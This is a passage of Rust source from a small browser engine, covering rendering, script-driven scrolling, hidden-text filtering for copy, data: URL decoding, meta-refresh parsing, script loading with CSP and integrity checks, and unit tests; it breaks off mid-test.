        let clip_of = |b: &LayoutBox| clips.get(&layout::box_addr(b)).copied();
        for b in &order {
            collect_links(b, clip_of(b), &mut links);
        }
        links.truncate(MAX_LINKS);
        let mut hits = Vec::new();
        for b in &order {
            collect_hits(b, clip_of(b), &mut hits);
        }
        *self.hits.borrow_mut() = hits;
        // Scripts see each box whole, even where it's clipped or scrolled
        // out of view.
        let mut whole = Vec::new();
        for b in &order {
            collect_hits(b, None, &mut whole);
        }
        *self.script_boxes.borrow_mut() = whole.into_iter().map(|(r, u)| (u, r)).collect();
        let mut texts = Vec::new();
        // Text pushed off the left, top or right is hidden; the page scrolls
        // down, so nothing below it is.
        let page = Rect {
            x: 0.0,
            y: 0.0,
            w: width,
            h: f32::MAX / 4.0,
        };
        collect_text(
            &root,
            &Seen::new(&order, page, clips.clone()),
            background,
            &mut texts,
            &mut 0,
        );
        // Tall enough to scroll to everything drawn, including positioned
        // boxes and text overflowing its box.
        // Clipped content doesn't count, or the page would scroll on past
        // what a box scrolls inside.
        let mb = root.dims.margin_box();
        let height = order.iter().fold(mb.y + mb.h, |h, b| {
            let bottom = content_bottom(b);
            h.max(clip_of(b).map_or(bottom, |c| bottom.min(c.y + c.h)))
        });
        let (in_layer, kinds) = paint::layer_map(&root);
        let scrollers: Vec<Scroller> = scroll_boxes
            .iter()
            .filter_map(|sb| {
                let rect = match clips.get(&sb.addr) {
                    Some(c) => c.intersect(sb.rect),
                    None => sb.rect,
                };
                (rect.w > 0.0 && rect.h > 0.0).then(|| Scroller {
                    uid: sb.uid,
                    rect,
                    x: sb.x,
                    y: sb.y,
                    max_x: sb.max_x,
                    max_y: sb.max_y,
                    layer: in_layer.get(&sb.addr).map(|&i| kinds[i].0),
                })
            })
            .collect();
        // Offsets past the end (the content got shorter) are pulled back.
        *self.scrolled.borrow_mut() = scroll_boxes.iter().map(|sb| (sb.uid, (sb.x, sb.y))).collect();
        *self.scrollers.borrow_mut() = scroll_boxes;
        Rendered {
            list,
            atlas,
            height,
            background,
            links,
            texts,
            layers,
            title: (self.title_px > 0.0)
                .then(|| paint::text_mask(&self.title, 0, self.title_px, paint::MAX_TITLE_W))
                .flatten(),
            scrollers,
        }
    }

    /// The boxes you can scroll inside, for scripts: node, offset, how far
    /// each can scroll, and the size of its padding box.
    pub fn scroll_info(&self) -> Vec<(u32, [f32; 6])> {
        self.scrollers
            .borrow()
            .iter()
            .map(|s| {
                (
                    s.uid,
                    [s.x, s.y, s.max_x, s.max_y, s.rect.w, s.rect.h].map(f32::round),
                )
            })
            .collect()
    }

    /// Apply the `scrollTop`/`scrollLeft`/`scrollTo()` scripts asked for.
    /// True if a box moved (render again). A box that doesn't scroll (yet)
    /// keeps the offset for when it does, as far as it can go then.
    pub fn apply_script_scrolls(&mut self, rt: &mut Runtime) -> bool {
        let mut changed = false;
        for (uid, x, y) in rt.take_scroll_sets() {
            let known = self.scrollers.borrow().iter().find(|s| s.uid == uid).copied();
            let mut scrolled = self.scrolled.borrow_mut();
            let cur = scrolled.get(&uid).copied().unwrap_or((0.0, 0.0));
            let clean = |v: Option<f32>, cur: f32, max: f32| {
                v.filter(|v| v.is_finite())
                    .map_or(cur, |v| v.clamp(0.0, max).round())
            };
            let (mx, my) = known.map_or((f32::MAX, f32::MAX), |s| (s.max_x, s.max_y));
            let to = (clean(x, cur.0, mx), clean(y, cur.1, my));
            if to != cur {
                scrolled.insert(uid, to);
                if let Some(s) = self.scrollers.borrow_mut().iter_mut().find(|s| s.uid == uid) {
                    (s.x, s.y) = to;
                }
                changed |= known.is_some();
            }
        }
        if changed {
            rt.set_scrollers(self.scroll_info());
        }
        changed
    }

    /// Scroll inside the box for node `uid` by (dx, dy), as far as it goes.
    /// `changed` says it moved (then render again); its scripts get a
    /// `scroll` event.
    pub fn scroll_box(&mut self, rt: Option<&mut Runtime>, uid: u32, dx: f32, dy: f32) -> Interaction {
        let Some(s) = self.scrollers.borrow().iter().find(|s| s.uid == uid).copied() else {
            return Interaction::default();
        };
        let (dx, dy) = (
            if dx.is_finite() { dx } else { 0.0 },
            if dy.is_finite() { dy } else { 0.0 },
        );
        let to = (
            (s.x + dx).clamp(0.0, s.max_x).round(),
            (s.y + dy).clamp(0.0, s.max_y).round(),
        );
        let changed = to != (s.x, s.y);
        if changed {
            self.scrolled.borrow_mut().insert(uid, to);
            for sc in self.scrollers.borrow_mut().iter_mut().filter(|sc| sc.uid == uid) {
                (sc.x, sc.y) = to;
            }
            if let Some(rt) = rt {
                rt.set_scrollers(self.scroll_info());
                rt.fire(uid, "scroll", false, false);
            }
        }
        Interaction {
            changed,
            ..Interaction::default()
        }
    }
}

/// The lowest point drawn by `b` itself (not its children): its border box,
/// or its text.
fn content_bottom(b: &LayoutBox) -> f32 {
    match &b.kind {
        BoxKind::Block(_) => {
            let bb = b.dims.border_box();
            bb.y + bb.h
        }
        BoxKind::Anonymous { frags, .. } => frags
            .iter()
            .map(|f| f.baseline + font::vmetrics(font::index(&f.style), f.style.font_size).1)
            .fold(0.0, f32::max),
    }
}

/// Most characters of a page's text sent for selection; past this, the rest
/// can't be selected.
pub const MAX_TEXT_CHARS: usize = 2_000_000;
/// Most text runs (words and spaces) and links per page, so a page can't
/// hand the browser more than it can look through quickly.
pub const MAX_TEXT_RUNS: usize = 500_000;
pub const MAX_LINKS: usize = 200_000;

/// What decides whether a piece of text can be seen. Text a page hides
/// from you (transparent, the colour of what's behind it, tiny, off the
/// page, clipped away, or covered by something opaque) isn't offered for
/// selecting and copying, so what you copy is what you saw.
struct Seen {
    /// The page: text entirely outside it is hidden.
    page: Rect,
    /// Each box's position in paint order, by address.
    order: HashMap<usize, usize>,
    /// Opaque floats and positioned boxes, with their paint-order position,
    /// which hide text painted before them.
    covers: Vec<(Rect, usize)>,
    /// `covers` indices by 256px band of the page.
    bands: HashMap<i64, Vec<usize>>,
    /// What `overflow` clips each box to (`layout::clip_map`).
    clips: HashMap<usize, Rect>,
}

/// Most covering boxes, and band entries, considered per page.
const MAX_COVERS: usize = 512;
const MAX_BAND_ENTRIES: usize = 64 * 1024;
const BAND: f32 = 256.0;

impl Seen {
    fn new(order: &[&LayoutBox], page: Rect, clips: HashMap<usize, Rect>) -> Seen {
        let mut covers = Vec::new();
        for (i, b) in order.iter().enumerate() {
            let s = b.style();
            let on_top = s.position != Position::Static || s.float != Float::None;
            if matches!(b.kind, BoxKind::Block(_))
                && on_top
                && s.background.a == 255
                && covers.len() < MAX_COVERS
            {
                covers.push((b.dims.border_box(), i));
            }
        }
        let mut bands: HashMap<i64, Vec<usize>> = HashMap::new();
        let mut entries = 0;
        for (k, (r, _)) in covers.iter().enumerate() {
            let (top, bottom) = ((r.y / BAND).floor() as i64, ((r.y + r.h) / BAND).floor() as i64);
            for band in top..=bottom {
                if entries >= MAX_BAND_ENTRIES {
                    break;
                }
                bands.entry(band).or_default().push(k);
                entries += 1;
            }
        }
        Seen {
            page,
            order: order.iter().enumerate().map(|(i, b)| (addr(b), i)).collect(),
            covers,
            bands,
            clips,
        }
    }

    /// Is `f`, at `rect` in a box painted `painted`-th, hidden from view?
    fn hidden(&self, f: &TextFrag, rect: Rect, under: Color, clip: Option<Rect>, painted: usize) -> bool {
        let s = &f.style;
        let faint = s.color.a < 26;
        let camouflaged = [(s.color.r, under.r), (s.color.g, under.g), (s.color.b, under.b)]
            .iter()
            .all(|(a, b)| a.abs_diff(*b) <= 8);
        let (cx, cy) = (rect.x + rect.w / 2.0, rect.y + rect.h / 2.0);
        let off_page = !overlaps(rect, self.page);
        let clipped = clip.is_some_and(|c| !c.contains(cx, cy));
        let covered = || {
            let band = (rect.y / BAND).floor() as i64;
            self.bands.get(&band).is_some_and(|ks| {
                ks.iter().any(|&k| {
                    let (r, i) = self.covers[k];
                    i > painted && contains(r, rect)
                })
            })
        };
        s.font_size < 4.0 || rect.w <= 0.0 || faint || camouflaged || off_page || clipped || covered()
    }
}

fn addr(b: &LayoutBox) -> usize {
    b as *const LayoutBox as usize
}

fn overlaps(a: Rect, b: Rect) -> bool {
    a.x < b.x + b.w && b.x < a.x + a.w && a.y < b.y + b.h && b.y < a.y + a.h
}

fn contains(outer: Rect, inner: Rect) -> bool {
    inner.x >= outer.x
        && inner.y >= outer.y
        && inner.x + inner.w <= outer.x + outer.w
        && inner.y + inner.h <= outer.y + outer.h
}

/// The visible text under `b`, in tree (reading) order, with where each
/// character ends. `under` is the background behind it, `clip` what an
/// `overflow` ancestor would clip it to, and `chars` counts what's been
/// collected so far.
fn collect_text(b: &LayoutBox, seen: &Seen, mut under: Color, out: &mut Vec<TextRun>, chars: &mut usize) {
    if let BoxKind::Block(_) = b.kind {
        let s = b.style();
        // Fixed and sticky boxes move with scrolling, so their text isn't
        // where selection looks for it.
        if matches!(s.position, Position::Fixed | Position::Sticky) {
            return;
        }
        if s.background.a == 255 {
            under = s.background;
        }
    }
    if let BoxKind::Anonymous { frags, .. } = &b.kind {
        let painted = seen.order.get(&addr(b)).copied().unwrap_or(0);
        let clip = seen.clips.get(&addr(b)).copied();
        for f in frags.iter().filter(|f| f.style.visible && !f.text.is_empty()) {
            let fi = font::index(&f.style);
            let (a, d) = font::vmetrics(fi, f.style.font_size);
            let rect = Rect {
                x: f.x,
                y: f.baseline - a,
                w: f.w,
                h: a + d,
            };
            let behind = if f.bg.a > 0 { f.bg } else { under };
            if seen.hidden(f, rect, behind, clip, painted) {
                continue;
            }
            let n = f.text.chars().count();
            if *chars + n > MAX_TEXT_CHARS || out.len() >= MAX_TEXT_RUNS {
                return;
            }
            *chars += n;
            let offsets = font::shape(fi, f.style.font_size, &f.text).char_offsets(&f.text);
            out.push(TextRun {
                rect,
                text: f.text.clone(),
                offsets,
            });
        }
    }
    for c in &b.children {
        collect_text(c, seen, under, out, chars);
    }
}

/// The address an `<img>` shows: `src`, or else the first `srcset` entry.
fn image_source(base: &str, e: &crate::dom::ElementData) -> Option<String> {
    let src = e
        .attrs
        .get("src")
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .or_else(|| {
            e.attrs
                .get("srcset")
                .and_then(|s| s.split(',').next())
                .and_then(|c| c.split_whitespace().next())
        })?;
    if src.len() > 4 && src[..5].eq_ignore_ascii_case("data:") {
        return Some(src.to_string());
    }
    Some(net::resolve(base, src))
}

/// The bytes of a `data:image/...` address (decoded here, no request):
/// base64, or for SVG also percent-encoded text.
pub(crate) fn data_url(url: &str) -> Option<Result<Vec<u8>, String>> {
    let rest = url
        .get(..5)
        .filter(|p| p.eq_ignore_ascii_case("data:"))
        .map(|_| &url[5..])?;
    let (meta, payload) = rest.split_once(',')?;
    let meta = meta.to_ascii_lowercase();
    if !meta.starts_with("image/") {
        return Some(Err("not an image".into()));
    }
    if meta.ends_with(";base64") {
        return Some(base64(payload).ok_or_else(|| "bad base64".to_string()));
    }
    if meta.starts_with("image/svg+xml") {
        return Some(Ok(percent_decode(payload)));
    }
    Some(Err("only base64 image data is supported".into()))
}

/// A `data:text/css` stylesheet's text (decoded here, no request): base64
/// or percent-encoded. `None` for any other address.
fn data_css(url: &str) -> Option<Result<String, String>> {
    let rest = url
        .get(..5)
        .filter(|p| p.eq_ignore_ascii_case("data:"))
        .map(|_| &url[5..])?;
    let (meta, payload) = rest.split_once(',')?;
    let meta: String = meta.to_ascii_lowercase().split_whitespace().collect();
    if !meta.starts_with("text/css") {
        return Some(Err("not a stylesheet".into()));
    }
    let bytes = if meta.ends_with(";base64") {
        base64(payload).ok_or_else(|| "bad base64".to_string())
    } else {
        Ok(percent_decode(payload))
    };
    Some(bytes.map(|b| String::from_utf8_lossy(&b).into_owned()))
}

/// `%XX` escapes decoded; anything malformed is kept as it is.
fn percent_decode(s: &str) -> Vec<u8> {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        let hex = |c: u8| (c as char).to_digit(16);
        match (
            b[i],
            b.get(i + 1).copied().and_then(hex),
            b.get(i + 2).copied().and_then(hex),
        ) {
            (b'%', Some(h), Some(l)) => {
                out.push((h * 16 + l) as u8);
                i += 3;
            }
            (c, ..) => {
                out.push(c);
                i += 1;
            }
        }
    }
    out
}

fn base64(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b' ' | b'\n' | b'\r' | b'\t' => continue,
            _ => return None,
        } as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// Style and link elements, in document order; inside `<noscript>` only
/// when scripts are off.
fn collect_style_elements<'a>(n: &'a Node, scripting: bool, out: &mut Vec<&'a Node>) {
    match n.tag() {
        Some("style") | Some("link") => out.push(n),
        Some("noscript") if scripting => {}
        _ => {
            for c in &n.children {
                collect_style_elements(c, scripting, out);
            }
        }
    }
}

/// The `content` of the first `<meta http-equiv="refresh">`; inside
/// `<noscript>` only when scripts are off.
fn meta_refresh(n: &Node, scripting: bool) -> Option<String> {
    let e = n.element()?;
    match e.tag.as_str() {
        "meta"
            if e.attrs
                .get("http-equiv")
                .is_some_and(|h| h.trim().eq_ignore_ascii_case("refresh")) =>
        {
            e.attrs.get("content").cloned()
        }
        "noscript" if scripting => None,
        _ => n.children.iter().find_map(|c| meta_refresh(c, scripting)),
    }
}

/// The URL in a refresh's `content` (`"5; url='/next'"`). The delay is
/// ignored: the page is left right away. One without a URL would only
/// reload the page over and over, so it gives `None`.
fn refresh_url(content: &str) -> Option<String> {
    let (delay, rest) = content.trim().split_once([';', ','])?;
    if delay.trim().is_empty() || !delay.trim().bytes().all(|b| b.is_ascii_digit() || b == b'.') {
        return None;
    }
    let rest = rest.trim_start();
    let rest = match rest.get(..3) {
        Some(u) if u.eq_ignore_ascii_case("url") => match rest[3..].trim_start().strip_prefix('=') {
            Some(r) => r.trim_start(),
            None => rest,
        },
        _ => rest,
    };
    let url = match rest.chars().next() {
        Some(q @ ('"' | '\'')) => rest[1..].split(q).next().unwrap_or_default(),
        _ => rest,
    };
    let url = url.trim();
    (!url.is_empty()).then(|| url.to_string())
}

/// Runs scripts while a page loads, fetching external ones from the browser.
struct ScriptLoader<'a> {
    fetched: usize,
    until: Instant,
    /// See [`Page::files`]: scripts not in it were added by scripts.
    from_server: &'a HashSet<String>,
}

impl ScriptLoader<'_> {
    /// `parser_inserted`: the script came with the document (rather than
    /// being added by a script).
    fn run(
        &mut self,
        rt: &mut Runtime,
        id: u32,
        src: Option<String>,
        code: String,
        host: &mut dyn Host,
        parser_inserted: bool,
    ) {
        // The page's Content Security Policy first: a refused script isn't
        // even fetched.
        if !rt.script_allowed(id, src.as_deref(), &code, parser_inserted) {
            return;
        }
        let (code, name) = match src {
            Some(url) if self.fetched < js::MAX_SCRIPTS => {
                self.fetched += 1;
                let csp = rt.script_sources(id, parser_inserted);
                let added = !self.from_server.contains(&url);
                let code = match host.fetch_script(&url, added, &csp) {
                    Ok(code) => code,
                    Err(_) => return, // shown in the request log
                };
                // Subresource Integrity: the file must be the one the page
                // expected.
                if !rt.integrity_ok(id, &url, &code) {
                    return;
                }
                (code, url)
            }
            Some(_) => return,
            None => (code, "inline script".to_string()),
        };
        rt.run_script(&code, id, &name);
    }

    /// Scripts that scripts added to the document.
    fn run_pending(&mut self, rt: &mut Runtime, host: &mut dyn Host) {
        for _ in 0..64 {
            let pending = rt.take_pending_scripts();
            if pending.is_empty() || Instant::now() >= self.until {
                return;
            }
            for (id, src, code) in pending {
                self.run(rt, id, src, code, host, false);
            }
        }
    }
}

/// One box's hit areas (called in paint order, so later boxes are on top).
fn collect_hits(b: &LayoutBox, clip: Option<Rect>, out: &mut Vec<(Rect, u32)>) {
    let mut push = |r: Rect, uid: u32| {
        let r = clip.map_or(r, |c| r.intersect(c));
        if !r.is_empty() {
            out.push((r, uid));
        }
    };
    // Hidden boxes take no clicks (a closed drawer over the page).
    if b.uid != 0 && b.style().visible {
        push(b.dims.border_box(), b.uid);
    }
    if let BoxKind::Anonymous { frags, .. } = &b.kind {
        for f in frags {
            let (a, d) = font::vmetrics(font::index(&f.style), f.style.font_size);
            push(
                Rect {
                    x: f.x,
                    y: f.baseline - a,
                    w: f.w,
                    h: a + d,
                },
                f.uid,
            );
        }
    }
}

fn collect_links(b: &LayoutBox, clip: Option<Rect>, out: &mut Vec<(Rect, String)>) {
    let mut push = |r: Rect, l: &String| {
        let r = clip.map_or(r, |c| r.intersect(c));
        if !r.is_empty() {
            out.push((r, l.clone()));
        }
    };
    if let (Some(l), BoxKind::Block(_)) = (&b.link, &b.kind) {
        push(b.dims.border_box(), l);
    }
    if let BoxKind::Anonymous { frags, .. } = &b.kind {
        for f in frags {
            if let Some(l) = &f.link {
                let (a, d) = font::vmetrics(font::index(&f.style), f.style.font_size);
                push(
                    Rect {
                        x: f.x,
                        y: f.baseline - a,
                        w: f.w,
                        h: a + d,
                    },
                    l,
                );
            }
        }
    }
}

impl Rendered {
    /// Topmost link under a page-space point.
    pub fn link_at(&self, x: f32, y: f32) -> Option<&str> {
        self.links
            .iter()
            .rev()
            .find(|(r, _)| r.contains(x, y))
            .map(|(_, l)| l.as_str())
    }
}

pub fn error_page(url: &str, err: &str) -> String {
    let esc = |s: &str| s.replace('&', "&amp;").replace('<', "&lt;");
    format!(
        "<title>Error</title><body style='font-family: sans-serif; margin: 40px; color: #333'>\
         <h1>Couldn't load this page</h1><p><code>{}</code></p><p style='color:#a00'>{}</p></body>",
        esc(url),
        esc(err)
    )
}

#[cfg(test)]
mod form_script_tests {
    use super::*;

    fn load(html: &str) -> (Page, Runtime) {
        let mut host = FetchOnly(|_: &str, _: Dest| Err("none".to_string()));
        let (page, rt, _) =
            Page::load_with_scripts("https://example.com/", html, "", (800.0, 600.0), &[], &mut host);
        let _ = page.render(800.0, 600.0);
        (page, rt.expect("scripts run"))
    }

    /// React streams content in late as `<div hidden id=S:0>` and moves it
    /// over the loading placeholder, which it finds by comment markers.
    #[test]
    fn scripts_see_comments_and_can_move_streamed_content() {
        let (page, _rt) = load(
            "<main><!--$?--><template id=B:0></template><p>Loading</p><!--/$--><i>after</i></main>\
             <div hidden id=S:0><p>The story</p></div>\
             <script>\
             const b = document.getElementById('B:0'), s = document.getElementById('S:0');\
             const start = b.previousSibling;\
             if (start.nodeType !== 8 || start.data !== '$?' || start.nodeName !== '#comment') throw 'no marker';\
             start.data = '$~';\
             s.parentNode.removeChild(s);\
             const parent = b.parentNode;\
             let c = b;\
             while (c) { const next = c.nextSibling;\
               if (c.nodeType === 8 && c.data === '/$') break;\
               parent.removeChild(c); c = next; }\
             while (s.firstChild) parent.insertBefore(s.firstChild, c);\
             start.data = '$';\
             document.body.appendChild(document.createComment('made'));\
             document.currentScript.remove();\
             </script>",
        );
        let text = page.dom.text_content();
        assert!(text.contains("The story"), "{text}");
        assert!(!text.contains("Loading"), "{text}");
        assert!(text.contains("after"));
        // Comments are kept but never shown as text.
        assert!(!text.contains('$') && !text.contains("made"), "{text}");
        let mut out = String::new();
        page.dom.dump(0, &mut out);
        assert!(out.contains("<!--$-->") && out.contains("<!--made-->"), "{out}");
    }

    #[test]
    fn scripts_see_typing_and_can_cancel_submission() {
        let (mut page, mut rt) = load(
            "<form id=f action=/s><input name=q id=q></form><p id=log></p>\
             <script>const q = document.getElementById('q'), log = document.getElementById('log');\
             q.addEventListener('input', () => log.textContent = 'typed ' + q.value);\
             document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault(); log.textContent += ' blocked'; });\
             </script>",
        );
        page.key(Some(&mut rt), Key::Tab);
        let r = page.type_text(Some(&mut rt), "hi");
        assert!(r.changed);
        assert!(page.dom.text_content().contains("typed hi"));
        let r = page.key(Some(&mut rt), Key::Enter);
        assert_eq!(r.submit, None, "the script cancelled it");
        assert!(page.dom.text_content().contains("typed hi blocked"));
    }

    #[test]
    fn form_submit_from_a_script() {
        let (mut page, mut rt) = load(
            "<form id=f action=/s><input name=q value=x id=q><button type=button id=b>go</button></form>\
             <script>document.getElementById('b').onclick = () => document.getElementById('f').submit();</script>",
        );
        // Focus the field, then "click" the button via Tab + a script click.
        rt.run_script("document.getElementById('b').click()", 0, "test");
        let r = page.key(Some(&mut rt), Key::Escape);
        assert_eq!(
            r.submit.map(|s| s.url).as_deref(),
            Some("https://example.com/s?q=x")
        );
    }
}

#[cfg(test)]
mod image_tests {
    use super::*;
    use crate::paint::DisplayCommand;

    /// A `w`×`h` opaque PNG.
    fn png(w: u32, h: u32) -> Vec<u8> {
        let mut out = Vec::new();
        {
            let mut e = ::png::Encoder::new(&mut out, w, h);
            e.set_color(::png::ColorType::Rgb);
            let mut wr = e.write_header().unwrap();
            wr.write_image_data(&vec![200; (w * h * 3) as usize]).unwrap();
        }
        out
    }

    /// Load `html`; image URLs ending in `/WxH.png` are served as PNGs of
    /// that size, anything else fails. Returns the page and what was fetched.
    fn load(html: &str) -> (Page, Vec<String>) {
        let mut page = Page::parse("https://example.com/", html, "", &mut |_, _| Err("none".into()));
        let mut asked = Vec::new();
        page.load_images(&mut |u, _| {
            asked.push(u.to_string());
            let name = u.rsplit('/').next().unwrap_or("");
            let size = name.strip_suffix(".png").and_then(|s| s.split_once('x'));
            match size.and_then(|(w, h)| Some((w.parse().ok()?, h.parse().ok()?))) {
                Some((w, h)) => Ok(png(w, h)),
                None => Err("404".into()),
            }
        });
        let _ = page.render(800.0, 600.0);
        (page, asked)
    }

    /// The border box of the element with this id.
    fn size_of(page: &Page, id: &str) -> (f32, f32) {
        let mut found = Vec::new();
        page.dom.walk(&mut found, &|n| {
            n.element().and_then(|e| e.attrs.get("id")).map(String::as_str) == Some(id)
        });
        let uid = found.first().expect("element").uid;
        let r = page
            .boxes()
            .into_iter()
            .find(|(u, _)| *u == uid)
            .map(|(_, r)| r)
            .expect("box");
        (r.w.round(), r.h.round())
    }

    #[test]
    fn images_are_sized_like_browsers_do() {
        let (page, _) = load(
            "<img id=a src=/100x50.png>\
             <img id=b src=/100x50.png width=40>\
             <img id=c src=/100x50.png style='height:10px'>\
             <img id=d src=/100x50.png width=30 height=30>\
             <div style='width:60px'><img id=e src=/100x50.png style='max-width:100%'></div>\
             <div style='width:200px'><img id=f src=/100x50.png style='width:50%'></div>\
             <img id=g src=/100x50.png width=40 height=90 style='height:auto'>",
        );
        assert_eq!(size_of(&page, "a"), (100.0, 50.0), "natural size");
        assert_eq!(size_of(&page, "b"), (40.0, 20.0), "width keeps the aspect ratio");
        assert_eq!(size_of(&page, "c"), (20.0, 10.0), "height keeps the aspect ratio");
        assert_eq!(size_of(&page, "d"), (30.0, 30.0), "both given");
        assert_eq!(size_of(&page, "e"), (60.0, 30.0), "max-width scales it down");
        assert_eq!(size_of(&page, "f"), (100.0, 50.0), "percent of the container");
        assert_eq!(
            size_of(&page, "g"),
            (40.0, 20.0),
            "height:auto overrides the attribute"
        );
    }

    #[test]
    fn failed_images_show_alt_text_and_each_url_is_fetched_once() {
        let (page, asked) = load(
            "<p><img src=/missing.gif alt='no picture'> <img src=/8x8.png> <img src=8x8.png>\
             <img srcset='/16x16.png 1x, /32x32.png 2x'> <img src=''></p>",
        );
        assert_eq!(
            asked,
            [
                "https://example.com/missing.gif",
                "https://example.com/8x8.png",
                "https://example.com/16x16.png"
            ]
        );
        let r = page.render(800.0, 600.0);
        let images: Vec<_> = r
            .list
            .iter()
            .filter_map(|c| match c {
                DisplayCommand::Image { rect, image } => Some((rect.w, rect.h, image.w, image.h)),
                _ => None,
            })
            .collect();
        assert_eq!(images, [(8.0, 8.0, 8, 8), (8.0, 8.0, 8, 8), (16.0, 16.0, 16, 16)]);
        // The same image at the same size is shared, not copied.
        let shared: Vec<_> = r
            .list
            .iter()
            .filter_map(|c| match c {
                DisplayCommand::Image { image, .. } => Some(std::sync::Arc::as_ptr(image)),
                _ => None,
            })
            .collect();
        assert_eq!(shared[0], shared[1]);
        // The only text on the page is the missing image's alt text.
        assert!(r.list.iter().any(|c| matches!(c, DisplayCommand::Glyphs { .. })));
        let (_, without_alt) = load("<p><img src=/missing.gif> <img src=/8x8.png></p>");
        assert!(without_alt.len() == 2);
    }

    #[test]
    fn images_are_cropped_by_overflow() {
        let (page, _) = load("<body style='margin:0'><div style='width:50px;height:30px;overflow:hidden'><img src=/100x100.png></div>");
        let r = page.render(800.0, 600.0);
        let (rect, img) = r
            .list
            .iter()
            .find_map(|c| match c {
                DisplayCommand::Image { rect, image } => Some((*rect, image.clone())),
                _ => None,
            })
            .expect("image drawn");
        assert!(rect.w <= 50.5 && rect.h <= 30.5, "{rect:?}");
        assert!(
            img.w <= 51 && img.h <= 31,
            "only the visible pixels are sent: {}x{}",
            img.w,
            img.h
        );
    }

    fn images_drawn(r: &Rendered) -> Vec<Rect> {
        r.list
            .iter()
            .filter_map(|c| match c {
                DisplayCommand::Image { rect, .. } => Some(*rect),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn background_images() {
        let body = "<body style='margin:0'>";
        // Fetched like any image, and tiled across the padding box.
        let (page, asked) = load(&format!(
            "{body}<div style='width:100px;height:50px;background-image:url(/20x20.png)'></div>"
        ));
        assert!(asked.iter().any(|u| u.ends_with("/20x20.png")), "{asked:?}");
        let tiles = images_drawn(&page.render(800.0, 600.0));
        assert_eq!(
            tiles.len(),
            15,
            "5 across, 3 down (the last row cropped): {tiles:?}"
        );
        assert!(tiles.iter().all(|t| t.y + t.h <= 50.5));
        // One copy, centred.
        let (page, _) = load(&format!(
            "{body}<div style='width:100px;height:50px;background:#eee url(/20x20.png) no-repeat center'></div>"
        ));
        let one = images_drawn(&page.render(800.0, 600.0));
        assert_eq!(one.len(), 1);
        assert!(
            (one[0].x - 40.0).abs() < 0.5 && (one[0].y - 15.0).abs() < 0.5,
            "{one:?}"
        );
        // Cover: scaled to fill, cropped to the box.
        let (page, _) = load(&format!(
            "{body}<div style='width:100px;height:50px;background-image:url(/20x20.png);background-size:cover;background-repeat:no-repeat'></div>"
        ));
        let cover = images_drawn(&page.render(800.0, 600.0));
        assert_eq!(cover.len(), 1);
        assert!(
            (cover[0].w - 100.0).abs() < 0.5 && (cover[0].h - 50.0).abs() < 0.5,
            "{cover:?}"
        );
    }

    #[test]
    fn gradients_are_drawn_without_fetching() {
        let (page, asked) = load(
            "<body style='margin:0'><div style='width:100px;height:50px;padding:5px;\
             background:linear-gradient(to right, red, blue)'></div>\
             <div style='width:10px;height:10px;background-image:linear-gradient(nonsense)'></div>",
        );
        assert!(asked.iter().all(|u| !u.contains("gradient")), "{asked:?}");
        let drawn = images_drawn(&page.render(800.0, 600.0));
        assert_eq!(drawn.len(), 1, "the broken one draws nothing: {drawn:?}");
        assert!(
            (drawn[0].w - 110.0).abs() < 0.5 && (drawn[0].h - 60.0).abs() < 0.5,
            "fills the padding box: {drawn:?}"
        );
    }

    #[test]
    fn images_are_drawn_at_the_size_shown() {
        let (page, _) = load("<img src=/400x200.png width=100>");
        let r = page.render(800.0, 600.0);
        let img = r
            .list
            .iter()
            .find_map(|c| match c {
                DisplayCommand::Image { image, .. } => Some(image.clone()),
                _ => None,
            })
            .expect("image drawn");
        assert_eq!((img.w, img.h), (100, 50));
    }

    #[test]
    fn data_stylesheets_are_decoded_without_a_request() {
        // ".a{color:red}" in base64, and percent-encoded.
        assert_eq!(
            data_css("data:text/css; charset=utf-8;base64,LmF7Y29sb3I6cmVkfQ==")
                .unwrap()
                .unwrap(),
            ".a{color:red}"
        );
        assert_eq!(
            data_css("data:text/css,.b%7Bcolor:blue%7D").unwrap().unwrap(),
            ".b{color:blue}"
        );
        assert!(data_css("data:text/html,x").unwrap().is_err());
        assert!(data_css("https://a.example/x.css").is_none());
    }

    #[test]
    fn data_urls_are_decoded_without_a_request() {
        let b64 = {
            const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            let bytes = png(3, 2);
            let mut s = String::new();
            for c in bytes.chunks(3) {
                let n = c
                    .iter()
                    .enumerate()
                    .fold(0u32, |a, (i, &b)| a | (b as u32) << (16 - 8 * i));
                for i in 0..4 {
                    if i <= c.len() {
                        s.push(T[(n >> (18 - 6 * i) & 63) as usize] as char);
                    } else {
                        s.push('=');
                    }
                }
            }
            s
        };
        let (page, asked) = load(&format!(
            "<img id=a src='data:image/png;base64,{b64}'>\
             <img id=s src=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='7' height='5'/%3E\">\
             <img src='data:text/html;base64,PGI+'>"
        ));
        assert!(asked.is_empty(), "{asked:?}");
        assert_eq!(size_of(&page, "a"), (3.0, 2.0));
        assert_eq!(size_of(&page, "s"), (7.0, 5.0));
        assert_eq!(base64("aGk="), Some(b"hi".to_vec()));
        assert_eq!(base64("a!"), None);
    }
}

#[cfg(test)]
mod text_tests {
    use super::*;
    use crate::select;

    fn render(html: &str) -> Rendered {
        let page = Page::parse("https://example.com/", html, "", &mut |_, _| Err("none".into()));
        page.render(800.0, 600.0)
    }

    /// The renderer draws the page's title for the tab bar, at the size
    /// asked for, so the browser never rasterizes text a page chose.
    #[test]
    fn meta_refresh_redirects() {
        let parse = |src: &str| Page::parse("https://a.test/x/", src, "", &mut |_, _| Err("no".into()));
        // DuckDuckGo's fallback for browsers without scripts.
        let ddg = r#"<noscript><meta http-equiv="refresh" content="0; url=&quot;https://html.duckduckgo.com/html&quot;"/><style>body { display: none }</style></noscript>"#;
        assert_eq!(
